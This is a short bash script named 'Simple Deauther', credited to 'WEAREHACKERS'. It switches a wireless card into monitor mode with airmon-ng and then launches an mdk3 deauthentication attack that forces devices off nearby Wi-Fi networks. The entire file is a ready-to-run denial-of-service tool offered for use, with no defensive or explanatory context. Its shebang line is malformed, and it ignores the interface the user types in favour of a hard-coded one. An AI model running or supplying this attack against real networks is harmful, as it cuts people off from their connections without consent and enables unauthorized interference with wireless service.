/#!/bin/bash
clear
echo "Simple Deauther";
echo
echo "				  By WEAREHACKERS"
echo ""
echo "Enter interface name"
read interface
airmon-ng start $interface
trap ctrl_c INT

function ctrl_c() {
        clear
	echo "EXITING"
        echo "Note: Leaving interface in Monitor Mode!"
        
}
clear
echo "Deauthing...";
mdk3 wlan0mon d



